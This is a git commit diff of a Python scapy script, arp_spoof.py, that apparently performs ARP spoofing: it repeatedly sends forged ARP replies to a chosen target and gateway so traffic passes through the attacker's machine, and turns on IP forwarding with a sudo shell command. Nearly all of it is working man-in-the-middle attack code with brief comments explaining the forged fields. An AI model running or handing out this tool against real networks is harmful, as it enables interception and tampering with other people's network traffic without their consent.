28abbc902f984c9e31270040ea48a58610883fc7
Saher Muhamed <81532683+SaherMuhamed@users.noreply.github.com>
2023-09-17 18:00:47 +0300

    Update arp_spoof.py

--- arp_spoof.py
+++ arp_spoof.py
@@ -1,75 +1,70 @@
 #!/usr/bin/env python3
 
 import time
+import sys
+import subprocess
+from argparse import ArgumentParser
 import scapy.all as scapy
-from optparse import OptionParser
+
+if sys.version_info < (3, 0):
+    sys.stderr.write("\nYou need python 3.0 or later to run this script\n")
+    sys.stderr.write(
+        "Please update and make sure you use the command python3 network_scanner.py -r <ip/24>\n\n")
+    sys.exit(0)
 
 
-def get_argument():
-    parser = OptionParser()
-    parser.add_option("-t", "--target", dest="target_address", help="Specify the IP address for your target device. "
-                                                                    "Example: --target_ip 192.168.1.7")
-    parser.add_option("-g", "--gateway", dest="gateway_address",
-                      help="Specify the IP address of the gateway to spoof. "
-                           "Example: --gateway_ip 192.168.1.1")
-    (options, arguments) = parser.parse_args()
+def args():
+    parser = ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target_address", help="Specify the IP address for your target device. "
+                                                                      "Example: --target 192.168.1.7")
+    parser.add_argument("-g", "--gateway", dest="gateway_address",
+                        help="Specify the IP address of the gateway to spoof. Example: --gateway 192.168.1.1")
+    options = parser.parse_args()
     if not options.target_address:
         parser.error("[-] Please specify the target IP address, or type it correctly, ex: -t 192.168.1.8")
     elif not options.gateway_address:
         parser.error("[-] Please specify the gateway IP address, or type it correctly, ex: -g 192.168.1.1")
-
     return options
 
 
-def get_mac_address(ip_address):
-    try:
-        # TODO 1: Create an ARP Request.
-        arp_request = scapy.ARP(pdst=ip_address)
+def fetch_mac_address(ip_address):
+    arp_request = scapy.ARP(pdst=ip_address)  # create an ARP request
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # broadcast an ARP packets to all devices in the network
+    broadcast_arp_packets = broadcast / arp_request  # combining these 2 packets together to send
 
-        # TODO 2: Broadcast an ARP Packets to all Devices in the Network.
-        broadcast_packets = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-
-        # TODO 3: Combining these 2 Packets together to Send.
-        broadcast_arp_packets = broadcast_packets / arp_request
-
-        # TODO 4: Start Send These Packets to all Devices.
-        answered_device = scapy.srp(x=broadcast_arp_packets, timeout=3, verbose=False)[0]
-        return answered_device[0][1].hwsrc
-    except IndexError:
-        pass
-
-
-def restore(destination_ip, source_ip):
-    destination_mac_address = get_mac_address(ip_address=destination_ip)
-    source_mac_address = get_mac_address(ip_address=source_ip)
-    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac_address, psrc=source_ip,
-                       hwsrc=source_mac_address)
-    scapy.send(packet, verbose=False, count=4)
+    ans, unans = scapy.srp(broadcast_arp_packets, timeout=2, verbose=False)  # send packets to all devices
+    return ans[0][1].hwsrc  # return only the mac address of the target
 
 
 def spoof(target_ip, spoof_ip):
-    # op=1 means this is a 'request' packet, op=2 means this is a 'response' packet.
-    # pdst='192.168.1.9', we're setting the target ip address to arp spoofing it.
-    # hwsrc='ec:5c:68:67:38:5d', we're setting the target mac address to arp spoofing it.
-    # psrc='192.168.1.1', this is false information to tell the target this response comes from the router
-    # and not comes from us.
-    target_mac_address = get_mac_address(ip_address=target_ip)
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address, psrc=spoof_ip)
-    scapy.send(packet, verbose=False)
+    target_mac_address = fetch_mac_address(ip_address=target_ip)
+    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address,
+                             psrc=spoof_ip)  # op=2 telling scapy to send ARP response, pdst=<target_ip>,
+    # hwdst=<target_mac>, psrc=<gateway_ip> (false information)
+    scapy.send(arp_response, verbose=False)
 
 
-option = get_argument()
+def restore(destination_ip, source_ip):
+    destination_mac_address = fetch_mac_address(ip_address=destination_ip)
+    source_mac_address = fetch_mac_address(ip_address=source_ip)
+    arp_response = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac_address, psrc=source_ip,
+                             hwsrc=source_mac_address)
+    scapy.send(arp_response, verbose=False, count=4)  # count=4 sent this packet 4 times
+
+
+option = args()
 target_ip_address = option.target_address
 gateway_ip_address = option.gateway_address
 
-print('')
 packets_counter = 0
 try:
+    subprocess.call("sudo echo 1 > /proc/sys/net/ipv4/ip_forward",
+                    shell=True)  # allow the packets to flow through our machine (security feature in kali linux)
     while True:
-        spoof(target_ip=target_ip_address, spoof_ip=gateway_ip_address)
-        spoof(target_ip=gateway_ip_address, spoof_ip=target_ip_address)
+        spoof(target_ip=target_ip_address, spoof_ip=gateway_ip_address)  # first packet goes to the client
+        spoof(target_ip=gateway_ip_address, spoof_ip=target_ip_address)  # second packet goes to the router
         packets_counter += 2
-        print(f'\r[+] Sent {packets_counter} Spoofed Packets.', end='')
+        print("\r[+] Sent " + str(packets_counter) + " Spoofed Packets.", end='')
         time.sleep(1.7)
 except KeyboardInterrupt:
     print("\n[*] Detected 'ctrl + c' pressed, program terminated.")
